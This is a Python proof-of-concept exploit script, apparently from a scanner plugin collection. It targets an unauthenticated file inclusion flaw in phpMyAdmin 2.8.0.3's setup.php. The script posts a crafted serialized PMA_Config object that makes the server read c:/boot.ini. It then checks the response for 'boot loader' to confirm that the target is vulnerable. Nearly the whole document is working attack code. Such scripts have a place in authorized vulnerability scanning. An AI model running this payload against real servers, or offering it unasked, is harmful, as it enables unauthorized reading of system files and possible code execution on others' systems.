#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PhpMyAdmin2.8.0.3无需登录任意文件包含导致代码执行
referer: http://www.mottoin.com/87915.html
author: Lucifer
description: 文件setup.php中,参数configuration经过序列化对象可导致文件包含漏洞。
'''
import sys
import json
import requests
import warnings




def poc(url):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/scripts/setup.php"
    post_data ={
        'configuration':'O:10:"PMA_Config":1:{s:6:"source";s:11:"c:/boot.ini";}',
        'action':'test'
    }
    vulnurl = url + payload
    try:
        req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
        if r"boot loader" in req.text:
            # print("[+]存在PhpMyAdmin2.8.0.3无需登录任意文件包含导致代码执行漏洞(WINDOWS)...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
            return {'payload': vulnurl, 'post_data': post_data, 'info': ''}
        else:
            pass

    except:
        pass

